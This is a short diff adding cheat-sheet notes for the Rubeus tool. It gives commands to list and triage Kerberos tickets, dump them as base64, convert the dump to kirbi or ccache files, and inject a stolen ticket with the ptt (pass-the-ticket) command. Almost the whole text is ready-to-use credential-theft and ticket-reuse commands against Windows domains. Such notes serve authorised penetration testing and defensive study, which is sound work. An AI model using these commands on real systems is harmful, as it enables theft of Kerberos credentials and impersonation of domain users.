@@ -1,0 +1,15 @@
+See tickets by users
+./Rubeus.exe klist
+See tickets by users and services without much information
+./Rubeus.exe triage
+Dump the tickets on base64
+./Rubeus.exe dump
+To change the base64 dumped TGT to a kirbi file, use this on windows:
+[IO.File]::WriteAllBytes("ticket.kirbi", [Convert]::FromBase64String(""))
+Or in linux:
+echo 'BASE64' | base64 -d > ticket.kirbi
+To use the ticket on linux, you will need to change the ticket from kirbi to ccache using ticket_converter.
+
+To use the ticket on windows just use:
+Load the tickets on base64 or from kirbi file.
+./Rubeus.exe ptt </ticket:BASE64 | /ticket:FILE.KIRBI>
